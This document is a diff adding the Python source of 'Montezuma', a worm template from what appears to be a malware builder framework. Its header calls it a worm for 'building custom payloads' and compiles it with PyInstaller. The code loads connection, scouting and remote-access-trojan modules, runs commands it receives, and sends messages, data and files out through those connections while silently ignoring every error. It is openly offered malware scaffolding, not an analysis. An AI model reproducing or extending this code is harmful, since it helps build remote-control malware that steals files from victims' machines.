@@ -1,0 +1,151 @@
+#!name##Montezuma
+#!types##worm
+#!info##[Py] The worm template written in Python, designed without a specific purpose. It allows integration of any number of additional Python-based modules. Ideal for building custom payloads and flexible worm structures in Python.
+#!processWorm##BasicProcess
+#!globalVar##COMPILER##PyInstaller##Compiler name
+
+
+from time import sleep
+import queue
+import os
+
+class Montezuma:
+    def __init__(self):
+        self.name = "{{WORM_NAME}}"
+        self.__modules = {{MODULES}}
+        self._modules = {"conn" : [], "scout" : [], "rat" : []}
+        self.working = False
+
+        self.in_cmd = queue.Queue()
+        self._work_pause = 0.2
+        
+
+    @property
+    def is_conn(self) -> bool:
+        return self._is_conn()
+    
+    @property
+    def modules(self) -> list:
+        return self._working_modules()
+    
+    @property
+    def conn_mods(self) -> list:
+        return self._modules["conn"]
+    
+    def connect(self) -> None:
+        for cm in self.conn_mods:
+            try:
+                cm.connect()
+            except:
+                pass
+    
+    def scout(self) -> None:
+        scout = {}
+        for m in self.modules:
+            try:
+                o = m.scout()
+                scout.update(o)
+            except AttributeError:
+                pass
+        
+    
+    def _is_conn(self) -> bool:
+        for mod in self.conn_mods:
+            if mod.is_conn:
+                return True
+        return False
+
+    def _load_modules(self) -> None:
+        other = []
+        for name, mod in self.__modules.items():
+            if not mod.MTYPES in self._modules.keys():
+                try:
+                    other.append(mod(self))
+                except:
+                    pass
+            else:
+                try:
+                    self._modules[mod.MTYPES].append(mod(self))
+                except:
+                    pass
+        self._modules["other"] = other
+    
+    def _start_modules(self) -> None:
+        for mod in self.modules:
+            try:
+                mod.start()
+            except:
+                pass
+
+    
+    def _working_modules(self) -> list:
+        mods = []
+        for ml in self._modules.values():
+            for mod in ml:
+                mods.append(mod)
+        return mods
+    
+
+    def work(self) -> None:
+        while self.working:
+            cmd = self.in_cmd.get()
+            self.exec_cmd(cmd)
+    
+    def send_msg(self, msg) -> None:
+        for cm in self.conn_mods:
+            try:
+                cm.send_msg(msg)
+            except AttributeError:
+                pass
+    
+    def send_data(self, msg) -> None:
+        for cm in self.conn_mods:
+            try:
+                cm.send_data(msg)
+            except AttributeError:
+                pass
+
+    def send_file(self, fpath: str, name: str = None, types: str = None, *args, **kwargs) -> None:
+        for cm in self.conn_mods:
+            try:
+                cm.send_file(fpath, name, types, *args, **kwargs)
+            except:
+                pass
+        
+    
+    def _exec_cmd(self, cmd: str) -> None:
+        cmd = cmd.rstrip("\n").split(" ")
+        match cmd[0]:
+            case "worm_close":
+                self.working = False
+                return
+            case "help":
+                self.help()
+                return
+        for m in self.modules:
+            try:
+                m.exec_cmd(cmd)
+            except:
+                pass
+
+    def exec_cmd(self, cmd: str) -> None:
+        self._exec_cmd(cmd)
+    
+    def help(self) -> str:
+        h = "\n--------- HELP -----------\n"
+        h += "'worm_close' - Shutdown Worm\n"
+        for m in self.modules:
+            try:
+                h += m.help()
+            except:
+                pass
+        self.send_msg(h)
+    
+    def Run(self) -> None:
+        self.working = True
+        self._load_modules()
+        self._start_modules()
+        self.work()
+
+if __name__ == "__main__":
+    Montezuma().Run()
